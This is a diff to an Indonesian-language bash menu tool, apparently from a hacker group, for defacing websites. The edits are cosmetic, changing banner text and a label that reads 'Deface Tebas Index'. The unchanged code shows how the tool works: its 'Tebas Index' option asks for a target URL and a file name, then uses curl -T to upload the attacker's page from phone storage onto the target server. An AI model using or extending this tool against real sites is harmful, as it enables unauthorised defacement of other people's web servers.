@@ -17,7 +17,7 @@ echo $cyan" ["$red"+"$cyan"]Author by	: Chemod_zrd404 "
 echo $cyan" ["$red"+"$cyan"]Team        : Indonesian Cyber Army		"
 echo $cyan" ["$red"+"$cyan"]Blog        : http://generasicyberindo.blogspot.com"
 echo $cyan" ["$red"+"$cyan"]Github	: https://github.com/21D4N404"
-echo $cyan" ["$white"NOTE : simpan script di memory internal di luar folder  "$cyan"]"
+echo $cyan" ["$white"NOTE : simpan script di memory internal di luar folder"$cyan"]"
 echo $purple"___________________________________________________"
 echo $red"	~"$cyan"{"$white"A"$cyan"}"$green".Tebas Index"$cyan"   {"$white"Q"$cyan"}"$red"Quit "
 echo $red"	~"$cyan"{"$white"B"$cyan"}"$green".Colong Script"$cyan" {"$white"I"$cyan"}"$red"Info "
@@ -33,7 +33,7 @@ if [ $apaan = "A" ] || [ $apaan = "a" ]
 then
  
 echo "                                          "
-figlet -f future Deface
+figlet -f future Deface Tebas Index
 echo $red "Masukan Target !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
 read -p " ╰─$ "  target
@@ -41,7 +41,7 @@ echo $green "Masukan Script !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Hajar"$white
 read -p " ╰─$ "  script
 curl -T /storage/emulated/0/$script $target
-echo $red "[+]>>>>> = $target/$script"
+echo $red "[+]>>>>> = $target"
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
 read -p "[B/Q] : " back
 fi
